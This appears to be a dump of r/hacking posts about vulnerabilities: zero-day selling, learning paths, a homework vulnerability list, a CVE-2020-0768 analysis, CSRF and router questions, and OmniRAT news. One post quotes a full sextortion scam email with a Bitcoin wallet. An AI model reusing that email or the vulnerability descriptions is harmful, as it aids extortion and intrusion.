Advice? Skill isn't really the issue here. Reverse engineering is something I'm already very competent at, for example. What's more important is things like sources, focus, contacts, reputability and statistics. For example, assuming I do find an RCE, what are the chances I can get paid? Can I use a broker, if so are they easy to get a hold of? Do I need to work much harder to get noticed enough in order to actually get paid? If you do this for a living, you have done so in the past, or you work for a company whose focus is on finding critical vulnerabilities, what would you recommend? Just to clarify: I'm not interested in penetration testing. I'm interested in finding _zero days_ and _selling them_ to people/organizations. I'm looking for answers from people who have had experience with this, either on their own or working for an organization."

5,vulnerability,hacking,Is this a good beginner learning path? How would you alter or improve this list?,1,hn3fma,https://www.reddit.com/r/hacking/comments/hn3fma/is_this_a_good_beginner_learning_path_how_would/,2020-07-08 07:23:44,"I've been searching for a beginner 'comprehensive' guide and have not been able to find one on here. Many of the beginner suggestions say things like 'do CTF' or 'HTB' or 'learn linux and think outside the box'. I'm positive some individuals can dive straight into those and flourish but I personally wanted to find a more structured learning approach. **Below is a comment I found on here laying out a learning path. Do you think this is good for a beginner? How would you alter this for a beginner?** &amp;#x200B; &gt;Here's my guide on how to become an Ethical Hacker. You should do everything in the sequence below. &gt; &gt;The First Thing you're going to need to do is learn how to Program. To start off id recommend learning Python, once you learn Python i'd recommend learning Java &gt; &gt;While not absolutely necessary, it would help if you were to learn Data Structures and Algorithms once you learn how to program, as it will make you a better Programmer. &gt; &gt;Once you understand how to program, you should learn how to Program in C. Some of the topics to pay attention to are Structs, pointer arithmetic, call-by-value versus call-by- reference, strings, I/O basics, macros and conditional compilation, and program structure. &gt; &gt;Learn the Fundamentals of a UNIX Operating System. Unix shells, shell variables, file system, and common Unix commands and programming with shell script. Learn end-user tools and commands for basic file manipulation, editing, compilation, as well as special features of the UNIX shell environment. &gt; &gt;Again, while not absolutely necessary, it would be beneficial to introduce yourself to Assembly Language Programming. Understand how assembly language instructions are translated into machine instructions and then into microprograms to be executed by the computer hardware and you should learn how to analyze an Assembly Language Program. It will help with Reverse Engineering &gt; &gt;Understand Computer Operating Systems and architecture. Process/thread management and Java multi-thread programming. Memory management. Virtual memory. File system interface and implementation. I/O systems. Distributed systems and Java networking programming. Protection and security. Understand computer systems basic organization and an overview of the major components and structures of operating systems. Some topics to cover are process management including processes, threads, process synchronization, CPU scheduling, Java-thread programming, and deadlocks as well as practical examples of different operating systems such as Windows and Unix/Linux. Other topics include memory management inclusive of main and virtual memory; file system interface and implementation, and protection and security. Get some experience with Windows, Linux/UNIX (GUI and command line experience with an understanding of command line tools), and computer networking. Understand System Administration, Operating Systems fundamentals &gt; &gt;Learning Cryptography will also be useful but not absolutely necessary. Some good things to learn are the Mathematics of Cryptography, Traditional Symmetric-Key Ciphers, Modern Symmetric-Key Ciphers, DES, AES, Asymmetric-Key Cryptography, RSA, Rabin, ElGamal and Elliptic Curve Cryptosystems, Message Integrity and Message Authentication, Cryptographic Hash Functions, Digital Signature, Entity Authentication, Key Management, Security at the Application Layer: PGP and S/MIME. &gt; &gt;Understand how Computer Networks and the Internet Work. Application layer to look at are the Web, HTTP, FTP, SMTP, DNS, and socket programming. Transport layer to look at are UDP, TCP, and congestion control. Network layer topics include link state routing, distance vector routing, IPv4, RIP, OSPF, BGP, IPv6, multicasting and IGMP, and mobile IP. Local area network topics include Ethernet, IEEE, 802.11, and Bluetooth. Also a good idea to look at other topics such as Network administration, Network Traffic Analysis using Wireshark, Penetration Testing and Network Security. You could also take a dive into Computer and network forensics, vulnerability and malware analysis, and low level protocol and packet analysis &gt; &gt;Understand Software Engineering. Understand the Phases of the software engineering process, models including requirements, architecture, design, coding, testing, and maintenance. Strength and weakness of software development process models etc &gt; &gt;Outside of the academic realm, some other good things to do are to participate in Capture the Flag Challenges. To start id recommend doing the National Cyber League in the Spring. It would also be beneficial to attend some Security conference like Blackhat and Defcon since you learn so much. Also keep visiting Network Security Forums and websites, and when you understand Networks well, set up your own. &gt; &gt;This guide is probably more difficult than what many of the people here would recommend, but it's absolutely necessary if you want to get into something like Ethical Hacking or Penetration Testing professionally. You can't be a script kiddie and become an ethical hacker. And what I wrote above isn't the half of all the background I have, so trust I know what i'm doing lol. &gt; &gt;If it's an option for you, i'd recommend trying to get a Degree in Computer Science, since it will make the learning much more structured compared to trying to learn all of this on your own. But it's not impossible to learn it on your own. Having a Computer Science degree will also make it allot easier to get a job in Pen Testing/Ethical Hacking. &amp;#x200B; **ABOUT ME:** I currently work as a front end developer but have always had an interest in ethical hacking, pen testing, and network security. I know HTML, CSS, JS, React and have a little experience with C#. Right now I have parts from a leftover build and thought it would be fun to make a machine dedicated to learning at home. Listening to Darknet Diaries really got me wanting to learn. I'd like to learn for fun and if I acquire skills I can bring into my career that's a plus. **I'm willing to dedicate time over years in order to develop this skill set and have fun with it in the same way I self taught my web development skills. I was dedicated to it, had fun with it, and got a job I enjoy because of it.** Thanks for any advice to a newbie starting the journey."

I have very bad news for you. 17/03/2020 - on this day I hacked your OS and got full access to your account [E-mail] So, you can change the password, yes... But my malware intercepts it every time. How I made it: In the software of the router, through which you went online, was a vulnerability. I just hacked this router and placed my malicious code on it. When you went online, my trojan was installed on the OS of your device. After that, I made a full dump of your disk (I have all your address book, history of viewing sites, all files, phone numbers and addresses of all your contacts). A month ago, I wanted to lock your device and ask for a not big amount of btc to unlock. But I looked at the sites that you regularly visit, and I was shocked by what I saw!!! I'm talk you about sites for adults. I want to say - you are a BIG pervert. Your fantasy is shifted far away from the normal course! And I got an idea.... I made a screenshot of the adult sites where did you enjoy (do you understand what it is about, huh?). After that I took a screenshot with your masturbation (using the camera of your device) and glued them together. Turned out amazing! You are so spectacular! I'm know that you would not like to show these screenshots to your friends, relatives or colleagues. I think $1250(USD) is a very, very small amount for my silence. Besides, I have been spying on you for so long, having spent a lot of time! Pay ONLY in Bitcoins! My BTC wallet: 1HQ4sBtyLf3cWZNPXjJgAPbBUyUiW31967 You do not know how to use bitcoins? Enter a query in any search engine: ""how to replenish btc wallet"". It's extremely easy For this payment I give you two days (48 hours). As soon as this letter is opened, the timer will work. After payment, my virus and dirty screenshots with your enjoys will be self-destruct automatically. If I do not receive from you the specified amount, then your device will be locked, and all your contacts will receive a screenshots with your ""enjoys"". I hope you understand your situation. - Do not try to find and destroy my virus! (All your data, files and screenshots is already uploaded to a remote server) - Do not try to contact me (this is not feasible, sender address is randomly generated) - Various security services will not help you; formatting a disk or destroying a device will not help, since your data is already on a remote server. P.S. You are not my single victim. so, I guarantee you that I will not disturb you again after payment! This is the word of honor hacker I also ask you to regularly update your antiviruses in the future. This way you will no longer fall into a similar situation. Do not hold evil! I just do my job. Have a nice day!"" I also got a similiar one before with the same time period. Everything was fine but, should I be worried?"

One was to find vulnerabilities in a poorly written newspaper server, and the other was to find a vulnerability in the protocol dissectors of an old version of Wireshark. Now after I finished with both of these (though to be honest I couldn't figure out the Wireshark one at all), I looked for a way to check my answers with other people. However, I couldn't seem to find anyone who'd finished it and shared the vulnerabilities. Would you all here be able to help me? It's pretty easy, even for someone like me. I also have my answers here to prove that I'm not just asking everyone here to do my homework: 1. In the authenticate function, command injection is possible by supplying a semicolon as a username. 2. There's an admin backdoor hard-coded in 3. The strcpy implementation in the writeArticle will continue running over and over again if no null byte is in the string, leading to a stack overflow (? I may have gotten the terminology wrong) 4. Buffer overflow in readArticle since while action\[1\] can be up to 1024 bytes, path can only take up to 100 5. In writeArticle, an attacker can overwrite any file with up to 1024 bytes 6. In readArticle, an attacker can read any file with a path length of up to 100 bytes and read up to 1000 bytes of said file 7. Command injection is possible in the addUser function (though I wasn't sure if this counted, since if you have admin function you can already run commands) 8. In userFunctions, if a username's first 5 characters contain the word admin, the user would get full admin functions 9. (I'm honestly not sure what I meant by this when I wrote this down) In the authenticate function, an attacker could cause a buffer overflow on search by providing a username longer than 50 bytes 10. In the authenticate function, you can pretty inject a command by providing a semicolon before your command (as a username) These are the ones that I could find after a few hours, unfortunately, I couldn't get the server to run so I can't test these vulnerabilities. Do these seem right to all of you? Is there any I missed, or any exploits that wouldn't work for one reason or another? Any feedback would be amazing, thank you!"

I have already tried Nessus Professional, but, although I liked their network scan, the web scanner login is very limited and doesn't work in all websites, and the authenticated scan is an important resource for us. Tenable io is a great solution, but it is good for companies that are scanning their own assets, because it has a limit of IP adresses and domain names it can scan for a period of 90 days, and that doesn't fit our needs, because we want a tool to scan different targets every week. Which Professional tools do you recommend for network and for web scanning in that case? It doesn't have to be one tool for both cases (in fact, I know that is quite impossible), I just want to know what you guys recommend. Thanks!"

31,vulnerability,hacking,Possible Vulnerability in Campus Portal Application,1,fh69ct,https://www.reddit.com/r/hacking/comments/fh69ct/possible_vulnerability_in_campus_portal/,2020-03-12 10:04:43,"Im going to preface this with the fact that I am not really involved with hacking generally. Most of my time is spent programming (in python). However, recently I have been bored in my classes and have been making things to automate anything I can think of (getting school news, signing up for a beta with a catchall, etc.) While doing this in python I often have to look at sending a request with headers (ex. ""username"": vybinx). While looking through the headers being sent on my school campus website I saw something familiar. CSRF-Protection: true. Because I am a complete loser I sometimes watch HTB run throughs and knew that this was cross site request forgery protection. Being curious I decided to send a login request to the url with CSRF-Protection marked as false... and it logged me in. Again, curious I decided to put the parsed version in the URL and try again.. and it worked. Basically this means, on the click of a link I can log in to the account specified in the URL. While looking through youtube and forum posts I have seen that login CSRF is often used on shopping websites etc to extract credit card data and other sensitive data. However, because this is a student portal nobody could really make a blank account and have the other person believe it is theirs. So, it is to my understanding that this vulnerability is fairly useless? Possible uses could include phishing attacks I guess? Was looking for input on what I should do with this knowledge or if this is even a vulnerability at all. PS. I am in highschool so keep that in mind. Here is an example URL query (dk if query is the right word) URL {sensitive info in the URL has been blocked} This query on click would login to the user in the URL's account automatically."

In a patch announcement recently released by Microsoft, Microsoft fixed a vulnerability submitted by Celestial ADLab security researchers, and the vulnerability number was CVE-2020-0768. The vulnerability is located in the ChakraCore engine code base and can affect both Internet Explorer 11 and Microsoft Edge (EdgeHTML) browsers. The vulnerability is a memory corruption vulnerability and there is a risk of remote code execution, so Microsoft rated it ""critical"" and thanks ADLab. 2. **Responses** 3. Use Windows automatic updates or manually download the patch package to fix the vulnerabilities. 4. Vulnerability and patch analysis 5. PART 1 6. This vulnerability is a data flow analysis error of a single instruction during the JIT compilation process of the ChakraCore engine, which results in the error activity analysis and register allocation errors. Start with the control flow diagram of the vulnerability sample: 7. &amp;#x200B; URL 1. &amp;#x200B; 2. &amp;#x200B; 3. Among them, the following byte code is in Block 4: 4. &amp;#x200B; URL 1. &amp;#x200B; 2. The symbol s10 stands for \[1337\], and s6 stands for const-modified arr. According to the terms of the principle of compilation, the variable definition value is called def, and the variable value is called use. In the InitConst instruction, s6 is def, s10 is used, and then under the StElemC instruction, s6 is used. It can be seen that s6 is closely related to s10. S6 can be regarded as a reference to the same variable by s10 according to another method. ChakraCore calls the copy-prop symbol a reference to the original symbol. But debugging shows that something went wrong here: 3. &amp;#x200B; 4. &amp;#x200B; URL 1. &amp;#x200B; 2. &amp;#x200B; 3. In this way, a key-value pair of s10 and s6 as the copy-prop symbol is formed, that is, s6-&gt; s10. Its stack trace is located at: 4. &amp;#x200B; 5. &amp;#x200B; 6. &amp;#x200B; URL 1. &amp;#x200B; 2. Error key-value pairs are based on the error results of data flow analysis. Subsequently, this key-value pair was added to blockOptData-&gt; capturedValues-&gt; copyPropSyms in Block 4, and its stack trace is located at: 3. &amp;#x200B; URL 1. Subsequently, in the front-to-back optimization process of JIT ForwardPass, block 4's blockOptData-&gt; capturedValues were merged to Block 5, which contains the key-value pair s6-&gt; s10, and its stack trace is located at: 2. &amp;#x200B; URL 1. &amp;#x200B; 2. Then, in the backward-to-forward optimization process of JIT BackwardPass, the upwardExposedUses of Block 5 accesses blockOptData-&gt; capturedValues-&gt; copyPropSyms and adds the key-value pair s6-&gt; s10. Its stack trace is located at: 3. &amp;#x200B; 4. &amp;#x200B; URL 1. upwardExposedUses is called ""upward exposed use"" in the compilation principle, it is a symmetrical process of variable activity analysis. Subsequently, in the process of backpropagation, upwardExposedUses containing the above key-value pairs are passed to Block 4, Block 3, and Block 2. As a Loop Header, Block 2 uses its upwardExposedUses for activity analysis and subsequent register allocation. 2. &amp;#x200B; 3. &amp;#x200B; URL 1. The above process can be represented by the following figure. It can be seen that the erroneous data undergoes forward and backward propagation, and is eventually contaminated in the entire range of the loop body. 2. &amp;#x200B; 3. &amp;#x200B; URL &amp;#x200B; 1. Subsequently, due to the above-mentioned erroneous data, the erroneous life cycle was calculated for s10 in the register allocation process of the JIT, and its life cycle spanned from the beginning to the end of the cycle. Therefore, the JIT inserts a MOV instruction in the form of MOV labelReg, mem, but does not initialize its instr-&gt; src-&gt; m\_offset, which is always 0. When the machine code was finally generated, a read memory operation pointing to a stack frame pointer with an offset of 0 was generated, which was expressed as \[EBP + 0x0\] or \[RBP + 0x0\]. &amp;#x200B; URL 1. In this way, an unexpected memory access reads illegal data into the context of the JavaScript engine and is then referenced in BailOut or other situations. Such illegal data will cause type confusion. 2. PART 2 3. The reason for the above-mentioned error data transmission is that the InitConst instruction actually did not get the correct data flow analysis in the JIT code of ChakraCore. Therefore, in the Microsoft repair, when the JIT first started to intervene, the InitConst instruction was replaced with the Ld\_A instruction. . 4. &amp;#x200B; URL 1. &amp;#x200B; 2. ChakraCore completely implements the data flow analysis of the Ld\_A instruction. At this time, in the analysis of Forward Pass, it was found that the key-value pair in Block 4 is no longer s6-&gt; s10, but s10-&gt; s6, that is, s10 is the original symbol and s6 is the copy-prop symbol that references s10. In this way, the transmission of erroneous data will naturally not be caused. Microsoft used the same code in IE11 to patch the vulnerability. 3. In fact, in the ECMAScript 6 standard, the const modifier is used to indicate that a variable can no longer be assigned after it is defined, which is a syntax-level constraint; the JIT process in the JavaScript engine always occurs after interpretation and execution. If the const modifier is Constraints are violated during the interpretation execution phase and will immediately exit without optimizing the JIT process. Therefore, the JIT process only needs to consider the data flow problem, not the constraints of the const modifier. Because ChakraCore uses the same set of intermediate languages during the optimization phase of JIT and the execution phase of interpretation, both Ld\_A and InitConst are compatible with the entire process of JIT. This vulnerability can be clearly considered as a business logic vulnerability. 4. **Reference link** 5. [URL 6. [URL"

41,vulnerability,hacking,Becoming a Penetration Tester/Hacker,1,fc2xni,https://www.reddit.com/r/hacking/comments/fc2xni/becoming_a_penetration_testerhacker/,2020-03-02 10:43:09,"So this question is asked quite frequently, and I thought it would make the most sense to explain what you'll need to know to become a hacker in this post. Now, before we get into the technical details, first some background about me. I have a Master of Science in Computer Science with a concentration in Telecommunications and Network Security. I have a Bachelor of Science in Information Technology with a concentration in Computer Forensics and a double minor in Computer Science &amp; Cybersecurity. And I have been a member of a Red Team for the past couple of years. So what are you going to need to know to be a Hacker? Here are the key concepts from the Study Guide that I used to prepare for an exam to get my Red Team Job Here's the list: - Programming/Scripting. You'll need to know basic programming concepts, and how to read and interpret scripts/code. You will need to be familiar with Shell scripting (e.g., cmd, wmic, bash), Interpreted languages (e.g. Python) and how to Interpret source code and scripts (e.g., Flow, variables, loops). You should be pretty familiar with a Scripting and/or programming language. You'll be able to find tons of information online regarding learning how to code. - Computer Architecture &amp; Networking. You'll need to understand the fundamentals and theory behind computer design, computer networking, and basic computing concepts. Some things you should be aware of is, Computer Math numbering systems and conversions, Computer concepts (e.g., CPU architectures, virtualization), Memory organization and layout, Storage concepts (e.g., hard disk drives, solid state drives) and the difference between kernel and user space. A good resource for learning this is [Computer Organization and Design ARM Edition:The Hardware Software Interface](URL - Operating Systems (Windows and Linux/UNIX). You'll need to learn of computer systems administration, software interactions and I/O interactions in either Windows or Unix implementations. Some things you'll need to know are Standard administrative commands, Local system configurations, Data security and integrity protection, Antivirus concepts and file systems. A Great resource for learning Operating System is the book [Operating System Concepts Tenth Edition](URL That website contains tons of useful information for that book including slides and study guides. But as a prerequisite for learning Operating Systems you should already be familiar with basic data structures, computer organization, and a high-level language, such as C or Java. - Network Design. You'll need to be aware of the operations, management, and maintenance of computer networks, protocols and standards and how they integrate with one another. Some things you should be familiar with are IP / subnetting, Ethernet, Routing, Network layout and design (i.e., network typology) and Networking device concepts (e.g., routers, firewalls, intrusion detection systems). There is a great CCNA prep course available [here](URL that you can learn this from. A good book to learn about Networking is [Computer Networking: A Top-Down Approach, By James F. Kurose](URL [This](URL is also a good resource for learning about networks from a security point of view - Networking Applications and Services. You'll need to know Protocols, and ports for standard network services, Network services and ports on standard Windows/Unix installs, Network-related commands and Network service administration and configuration. For this you can use the resources from above. So those are the Fundamentals that you need to know to become a Hacker. Once you have those down, you can move onto learning some more advanced concepts. Some of those concepts would be: - Information security tools and techniques: Network monitoring, Network mapping, Vulnerability scanning, Penetration testing - Offensive information security - Digital forensics and data recovery - Voice/data communications (satellite, RF, wireless, and telecommunications networks) - Public key infrastructure and encryption systems - Command line tools - Network traffic analysis - Computer and network forensics - Vulnerability and malware analysis - Low level protocol and packet analysis So I am aware that many people want to become a Hacker or Penetration Tester professionally so I will briefly be discussing how one can best do that. **Education**: For a Degree, i'd recommend a degree in Computer Science, Computer Engineering, Computer Security, Cybersecurity (Technical Track), Cyber Operations or Information Technology. I'd recommend attending a school that is either an NSA Accredited [CAE-CD](URL or [CAE in Cyber Operations](URL **Experience**: You're going to need some experience if you're going to become a Pen Tester or Red Team Member. Some good experience to gain would be UNIX/Linux system administration, Windows system administration, Network Security, Network Administration - security and engineering, networking equipment (routers/firewalls/switches) and VPN administration **Certifications**: Some good entry level Penetration Testing Certifications would be the OSCP, very practical and well respected. And the Security + is generally a baseline for Security Jobs. And i'd advise against the CEH, its not practical at all and you can just memorize the answers and pass without actually knowing how to hack anything **Good ways to practice**: Theoretical knowledge is nothing if you cant practice it. There are a number of different ways you can get experience in Offensive Security (Legally of course). Capture the Flag Events such as the National Cyber League are great ways to apply your knowledge. And HacktheBox (while a bit more advanced) is probably the closest you can get to a real world Network Penetration Testing environment. **Conclusion**: I couldn't cover everything here, but I hope I was able to give you guys some solid knowledge that you can build on. Feel free to ask me any questions or send me a message if you have any questions. Thanks!"

47,vulnerability,hacking,Bug Bounty Platform - Game Hacking,1,e969qg,https://www.reddit.com/r/hacking/comments/e969qg/bug_bounty_platform_game_hacking/,2019-12-11 23:06:41,"Dear fellow hackers As a startup company (Cyrex Ltd) that is specialised in application security, we are developing a bug bounty platform (codename: SnowHat) that is entirely focused on hacking gaming applications. We strongly believe that gaming applications are different than classic industry applications. Consider the used programming language, frameworks, architecture and more importantly the way data is being transmitted (transport protocol). Therefore, it's a natural direction for us, to create a bug bounty platform that is fully focused around the security of gaming applications. The objective of this thread is to validate the concept of our product/service. Therefore, **your** **feedback** is extremely valuable to us, especially in this phase of development where the platform is subject to constant change. **Mindset** Game hacking is very different in comparison with classic penetration testing, it requires two mindsets, one of a cheater and one of a hacker. Two very similar mindsets yet there are distinct differences between them. Cheating is all about finding an advantage that a regular player would not be able to have, this requires gaming knowledge, strategic insights and most importantly quickly understanding in game mechanics. While hacking, is all about exploiting technical vulnerabilities, understanding what is going on under the hood of the application. **Assets** The platform currently covers the following categories: 1. Games (browser, mobile, client and console) 2. Game relatable applications (forums, launchers, management tools, ...) 3. Anti cheat solutions/wrappers (EAC, BattlEye, ...) **Gamification** Through gamification (challenges, achievements, ...) we want to create a bug bounty platform that encourages hackers to start their journey as a white hat security expert and more importantly reward them for their findings. We have implemented clan mechanics just like in any other MMO, this in order to build a community and add in that competitive element, which really takes this platform to a next level. Ranks are implemented accompanied by leaderboards, ranks are based on the prestige of the player. Prestige points are unlocked for each legit disclosed report. **Communities** For SnowHat it made full sense to cooperate with hacking communities, as these communities are often where all things start. They act as a gold mine of educational resources that will help any hackers in developing their hacking skill set. Therefore, we want to give back to those communities by partnering up. For each member originating from these communities that finds a vulnerability, a percentage of the bounty is paid back to the community by SnowHat. Two large partnerships were established so far, this generating over 500K members joining the platform. **Gaming companies** Next to generating a user base of ethical hackers, we started establishing partnerships with the gaming companies, an obvious yet fundamental element that will define the success of SnowHat. The platform targets mid to large size companies that either develop or publish gaming applications with multiplayer features, which makes sense as there's no such thing as security in offline games. **Communication and QA** SnowHat acts as an intermediate communication layer between the ethical hacker and the gaming company. The ethical hacker will never be in direct contact with the gaming company, the ethical hacker will be collaborating with SnowHat staff, vice versa for gaming companies. In this way we can maintain and enforce quality assurance on many different levels (communication, quality of report, triage, ...). **Release** Best-case, we are planning to release into beta in about 3 months. At first the beta will only be accessible to the members of the communities we've partnered with. After continuous validation of at least 1 month, the platform will be publicly available to anyone. To give you an idea of what the platform will look like, we included the following images (screenshots). Take into account that all of this is subject to change, thus not a final version. By using dummy data some of the screenshots might be confusing.

48,vulnerability,hacking,Is this a vulnerability in my router's web management interface?,1,ecyh1h,https://www.reddit.com/r/hacking/comments/ecyh1h/is_this_a_vulnerability_in_my_routers_web/,2019-12-20 06:58:43,"I'm using Burp Suite to intercept web requests/responses between my host and my home router's web interface. When logging in to the router's web interface, I noticed that I can see the admin password in plaintext within the request. Obviously this is concerning as someone knowing my router's admin password could take control of my router. However, is that really a problem since the management interface isn't accessible via the Internet and since no one should be able to see my requests/responses? Any way to exploit this in the eyes of an attacker? Example: If this router provided Wi-Fi to a coffee shop, could anyone hypothetically watch the router's traffic and wait for me to log in to the router's web interface to grab the admin password?"

50,vulnerability,hacking,What now?,1,dvfhh8,https://www.reddit.com/r/hacking/comments/dvfhh8/what_now/,2019-11-13 07:07:39,"When I first started learning hacking, it seemed vast. So many tools, ways to hack, steps, like the possibilities are endless, but now, it seems like there is only a straight forward way to do things. For example, this is the basic HTB hack for me, do an nmap scan, explore the website, brute-force using dirbuster, find a vulnerability in one of the open ports from the nmap scan, look up the vulnerability, and exploit it using some exploitation software like metasploit. That has always been the way to do it. Ive never gotten into realistic boxes just because of the lack of experience, but thats why Im asking today. I want to get into the more realistic boxes, but I dont know how. The only method I know is the one in the paragraph above. I dont get the idea of hacking when its not done like that. Ive looked everywhere for different methods, Ive tried a lot, but failed. Im pretty decent with python and Im interested in creating exploits with it, but I cant find any vulnerabilities in any software to exploit. If I had VIP on HTB, that would probably end most of the problems Im currently having, but I dont, and I never will. Paying for anything at all is off the table, Im doing this without buying books or paying for services online. What do I do? Im fairly young, 14 to be exact, and Im lost. Ive been in the programming scene since I was 12 and dont plane on leaving. Ive been strictly python, and since last year, Ive gotten into hacking, ethically, of course. I wish to combine my two favorite hobbies (hacking and coding) and maybe create exploits, but to do that, I first need to find the vulnerability/vulnerabilities, know how to exploit the vulnerabilities with a pre-made exploit, then create my own (that was my thought process anyway). In the end, the problem is, I have no clue how to hack. I have trouble with some of the simplest boxes, (Ive tried Networked, I failed miserably) I got into OTW Bandit, and had to look up a lot of the answers. I need help. Ive been doing this shit for the past year and still have no clue how to do it, but its a passion, I want to pursue this career, but I cant do it without help. And for the few people that read this far, thank you. So what am I asking? All I want is a source, book, YouTuber, blog, website, or even just somebody to help me better understand the tools I have at hand. I have a computer, I have Kali installed on a VM, along with Linux Mint for coding my python projects, Metasploitable 2 and windows for trying to use exploits that always fail in the end. If somebody could point me in the right direction, that would be amazing. I want to learn how to hack outside of the realm of using nmap to scan for open ports with vulnerabilities that can be exploited with a google search. I want something more realistic, but I dont have the money to pay for anything like VIP Access to HTB. Is that even possible? Ive hit the plateau that everyone hits, and Im ready to get going again. Any and all help is welcome, and thanks to everyone in advance. TL;DR: I want to learn to hack outside of the realm of doing an nmap scan on an unrealistic target and using exploits from google searches. FOR FREE"

He is very controlling and has even bought a switch for the network to program it and manage the network.

I came to you guys because I needed help in confirming or denying a fear I have. So here's the thing: Some days ago I was playing a Roblox game (don't judge, they're fun.) The chat was filled with this obnoxious kid just generally being nasty to everyone who was chatting. A new person arrived and the kid unsurprisingly began to bother them as well. Now this new person was different in that they warned the kid about ""consequences,"" the kid obviously didn't shut up, and in like a minute or so the kid disconnected. He didn't leave, he was visibly in the middle of completing an obstacle course in-game. The person then told us that they had obtained information about the kid, remote-accessed their router, and then disabled it for some hours. I know remote-accessing routers is possible, but I still don't get if this person actually said the truth or if it was a coincidence. If they were telling the truth, how the hell did they get this kid's information through the Roblox client? Like the whole event was very quick, even if it was a coincidence it was really accurately timed. Surely that's a massive security issue, especially in a site filled with children, no?

Apologies if this is not considered on topic, but I hope you might be able to help me out with a few questions for some fiction I'm writing, and would appreciate a brief moment of your time! I write a lot of sci-fi, but it's mostly psychology &amp; AI theory based... and I'm currently working on something involving a (slightly) more realistic data security side to the story. I'm generally computer-literate, but I wanted to verify certain scenarios that extend beyond my knowledge. I tried googling, but got mixed results. Because it's sci-fi, I'm comfortable with stretching the bounds of tech reality to an extent, but I'd like the basics to be accurate when it comes to the functions we have today. The general scenario is that there is a corporate entity (in the tech sector) which is collecting data from several (fictional) devices. It's then storing and analyzing the data within a ""black box"" department of the company. The data is also backed up elsewhere. I'd like to have some mostly realistic hacking in play for the attack on this data. The goals for my characters are the following: A) Identify how many of these devices are transmitting data to the company (and from where). I can do this easily by making them GPS-enabled, and tracked internally, I assume. B) Stop these devices from being able to transmit said data, in perpetuity. Ideally through some irreversible kill function, relayed from the controlling/data collecting server. C) Acquire the data and erase it from its primary storage location within the company, as well as its backup location(s), ideally setting off no ""mass deletion"" or file editing red flags. So... because the data is primarily kept within that ""black box"" department, my instinct is that it's kept on an intranet. (Collected, first with an extranet?), which would mean it would have to be physically copied over, correct? That would be fine, I have a plan to access that intranet physically (assuming that's the correct way they'd set that up). However, when it comes to the back up, I would assume the data would be kept off-site. I guess the question here is, for something kept so secure, would a company be likely to transmit it digitally, or physically? If digitally, is there a process by which the data could be ""intercepted,"" and replaced with corrupted files that could trick a checksum into thinking the data was mirrored? My instinct says no to the checksum, but I'd be more than happy with an ""interception"" that would still replace the transmitted data with corrupted files that would initially trick a human verifying the transfer. Also, along this same thread, if a hacker was able to access the stored data, is there a way for them to ""replace"" it or corrupt it in a way that wouldn't set off any immediate alarms? Assuming this company isn't just trying to keep the data safe and backed up, but also keep its existence, let alone contents, unknown, is there anything beyond encryption they might do to secure it? If so, is there a feasible hack around any such protocols? And last one, I feel like this will require some more fictional-tech to do. If my characters get a hold of one of these devices, considering it has no screen/buttons, etc. how feasible would it be for them to reverse engineer it enough to come up with the necessary code to effectively break it, for when they gain access to the controlling/monitoring computer? Again, apologies if these are dumb questions, but I'd basically like to create a believably ""impenetrable"" data storage protocol for a company that would be super paranoid and tech savvy, that some clever hackers could still exploit a near-invisible vulnerability to. If I'm way off base on my assumptions or understanding, I'd welcome any and all corrections and I'd love to hear how to better approach it. Thanks in advance!"

Facebook made it clear that the issue might not receive a fix owing to infrastructure limitations,** Now, with regards to the availability of the WhatsApp Decryptor, Facebook has once again preferred to stay aloof from the matter. According to their statement shared with BBC, We carefully reviewed this issue a year ago and it is false to suggest there is a vulnerability with the security we provide on WhatsApp. The scenario described here is merely the mobile equivalent of altering replies in an email thread to make it look like something a person didnt write. We need to be mindful that addressing concerns raised by these researchers could make WhatsApp less private  such as storing information about the origin of messages. In such a situation, it might be harmful to have a decryptor tool accessible to many. However, the researchers have a justification ready to support their action. One of the Check Point Researchers, Oded Vanunu, told BBC, WhatsApp\] serves 30% of the global population. Its our responsibility. There is a big problem with fake news and manipulation. Its an infrastructure that serves more than 1.5 billion users. We cannot put it aside and say: Okay, this is not happening. It isnt clear if Facebook has any plans to address this problem anytime soon. **Let us know your thoughts in the comments.**"

Only works on Android devices however so if you're on IOS or PC u can't get it. If your on Android however I do encourage downloading it. The German police yesterday raided the house of the developer of OmniRAT and seized his laptop, computer and mobile phones probably as part of an investigation into a recent cyber attack. More Info on : URL Download 'The Geek App Reloaded By Alien Skills' from Google Play. The world's best handbook for Security Experts with 1 Million+ downloads. The German police yesterday raided the house of the developer of OmniRAT and seized his laptop, computer and mobile phones probably as part of an investigation into a recent cyber attack, a source told. OmniRAT made headlines in November 2015 when its developer launched it as a legitimate remote administration tool for IT experts and companies to manage their devices with explicit permissions. Available between $25 and $100, OmniRAT quickly became one of the most popular remote administration tools, allowing users to monitor Android, Windows, Linux, and Mac devices remotely and access every available information on them. However, just like any other remote administration tool like DroidJack, DarkComet, AndroRAT, and njRAT, some customers of OmniRAT also used the tool for illicit purposes, especially because it was available at a far cheaper price than other RATs in the market. In one such event earlier this year, a group of hackers attempted to target several industries by exploiting an old remote code execution vulnerability (CVE-2016-7262) in Microsoft Excel that eventually installed OmniRAT on targeted computers. According to a security researcher who reported this incident in January, the attackers used a malformed Excel sheet disguising as a business profile of ""Kuwait Petroleum Corporation (KPC)"" to lure its victims into opening the attachment. Though Kuwait Petroleum Company was not itself targeted by the malware, another anonymous source told that almost two months ago, lawyers representing the oil company started emailing the domain registrar from where the official domain of OmniRAT was registered and demanded them to disclose the identity of the domain owner, citing whois-related GDPR and ICANN rules. The content on the official OmniRAT website has been unavailable since last few days, which has probably been taken down by its developer to prevent its domain registrar from disclosing his identity to the company. The developer of OmniRAT reportedly resides in Germany, but his/her identity is still unknown to the public. At this moment, it's not clear if the raid by German police is linked to the efforts made by Kuwait Oil Company or involves some separate criminal case against him. It's also possible that the German police could be behind the list and identity of all the customers who purchased OmniRAT in the last four years to crack down on cybercriminals abusing the tool. In a similar operation in 2015, law enforcement agencies in several countries raided homes and arrested suspected users of DroidJack smartphone malware. Though creating malware or hacking tool is illegal in Germany, like many other countries, it also depends upon how the tool has been advertised. Because just like penetration testing tools, remote administration tools are also a two-sided sword and can be used for both legal and illegal purposes. In one case, it was reported that two years ago a group of hackers were using OmniRAT to spy on Islamic State (ISIS) members and supporters by distributing its Android version via the popular Telegram messaging app. A disclaimer, as shared below, posted on the official OmniRAT website also said that the tool is not for hacking and that customers are themselves liable for any misuse. ""OmniRAT is created by German authors, and the servers are also located in Germany. Therefore the German law applies for us. OmniRAT is a remote administration tool (rat). It is not  as many believe  a trojan neither made for hacking; therefore, it is not illegal and does not violate the law. The 